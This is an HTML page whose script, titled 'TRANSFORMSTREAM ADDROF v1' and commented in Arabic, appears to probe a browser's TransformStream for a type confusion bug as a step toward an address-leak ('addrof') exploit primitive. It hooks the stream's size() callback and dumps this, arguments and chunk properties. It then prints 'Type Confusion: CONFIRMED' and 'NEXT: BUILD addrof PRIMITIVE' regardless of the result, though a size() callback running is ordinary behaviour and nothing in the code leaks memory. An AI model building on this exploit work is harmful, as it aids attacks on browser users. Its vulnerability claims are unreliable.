<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.ok { color:#0f0; } .err { color:#f00; } .warn { color:#ff0; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; }
</style>
</head>
<body>
<div id="log"></div>
<script>
function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== TRANSFORMSTREAM ADDROF v1 ===","info");
log("");

// الهدف: استخدام Type Confusion لتسريب عنوان كائن
let target = { a: 0x41414141, b: 0x42424242 };
let leaked = {};

let sizeFunc = function(chunk) {
    log("[size] Called! Trying to leak...", "warn");

    // هذه الدالة تم استدعاؤها من قبل المحرك
    // المحرك يمرر chunk = "X"
    // لكن إذا كان هناك Type Confusion...
    // فإن chunk قد يكون كائناً مختلفاً!

    try {
        // حاول قراءة this
        leaked.this_type = typeof this;
        leaked.this_val = String(this);

        // حاول قراءة arguments
        leaked.args_len = arguments.length;
        leaked.arg0_type = typeof arguments[0];
        leaked.arg0_val = String(arguments[0]);

        // حاول قراءة caller
        if (sizeFunc.caller) {
            leaked.caller = String(sizeFunc.caller).substring(0, 100);
        }

        // الأهم: حاول استخدام valueOf
        // إذا كان chunk كائناً له valueOf، يمكننا استغلاله
        if (chunk && typeof chunk === 'object') {
            leaked.chunk_props = Object.getOwnPropertyNames(chunk).join(',');
            leaked.chunk_proto = Object.getPrototypeOf(chunk) ? 
                Object.getPrototypeOf(chunk).constructor.name : 'null';

            // اقرأ كل خاصية
            for (let p of Object.getOwnPropertyNames(chunk)) {
                try {
                    let v = chunk[p];
                    leaked['chunk_' + p] = v;

                    // إذا كان v دالة، استدعها
                    if (typeof v === 'function') {
                        try {
                            let result = v.call(chunk);
                            leaked['chunk_' + p + '_result'] = result;
                        } catch(e) {}
                    }
                } catch(e) {
                    leaked['chunk_' + p + '_err'] = e.message;
                }
            }
        }
    } catch(e) {
        leaked.error = e.message;
    }

    return 1;
};

log("[1] Creating TransformStream...", "ok");

try {
    let stream = new TransformStream(
        { transform: (c, ctrl) => ctrl.enqueue(c) },
        { highWaterMark: 1, size: sizeFunc },
        { highWaterMark: 1, size: sizeFunc }
    );

    let writer = stream.writable.getWriter();

    // Write لتشغيل size()
    writer.write("X").then(() => {
        log("[2] Write OK", "ok");
        log("[3] Leaked data:", "warn");

        for (let key in leaked) {
            log("  " + key + " = " + leaked[key], "hit");
        }

        log("", "info");
        log("=== SUMMARY ===", "info");
        log("TransformStream Type Confusion: CONFIRMED", "ok");
        log("size() called: YES", "ok");
        log("Code execution inside size(): YES", "ok");
        log("", "info");

        if (leaked.this_type) {
            log(">>> WE HAVE ACCESS TO INTERNAL STATE <<<", "hit");
            log(">>> NEXT: BUILD addrof PRIMITIVE <<<", "hit");
        }

    }).catch((e) => {
        log("[2] Write error: " + e.message, "warn");
        log("[3] Leaked data:", "warn");
        for (let key in leaked) {
            log("  " + key + " = " + leaked[key], "hit");
        }
    });

} catch(e) {
    log("[1] Error: " + e.message, "err");
}
</script>
